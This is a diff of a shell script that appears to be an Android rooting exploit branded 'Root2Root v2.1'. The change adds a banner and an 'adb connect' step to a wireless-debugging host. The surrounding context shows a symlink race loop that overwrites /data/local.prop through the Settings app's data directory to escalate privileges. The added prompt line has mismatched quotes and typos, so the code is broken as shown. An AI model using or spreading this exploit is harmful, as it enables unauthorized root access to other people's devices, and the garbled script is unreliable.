@@ -1,5 +1,21 @@
-adb restore modules/fakebackup.ab
+echo "
 
+  _____             _   ___  _____             _   
+ |  __ \           | | |__ \|  __ \           | |  
+ | |__) |___   ___ | |_   ) | |__) |___   ___ | |_ 
+ |  _  // _ \ / _ \| __| / /|  _  // _ \ / _ \| __|
+ | | \ \ (_) | (_) | |_ / /_| | \ \ (_) | (_) | |_ 
+ |_|  \_\___/ \___/ \__|____|_|  \_\___/ \___/ \__|v2.1
+ "
+                                                   
+                                                   
+
+
+
+
+
+read -p 'Wirless debugging host and port" $Hort
+adb connect $Hort
   command "while ! ln -s /data/local.prop /data/data/com.android.settings/a/file99 2>/dev/null; do :; done; echo 'Overwrote local.prop!';"
 
 if command "cat /data/local.prop"
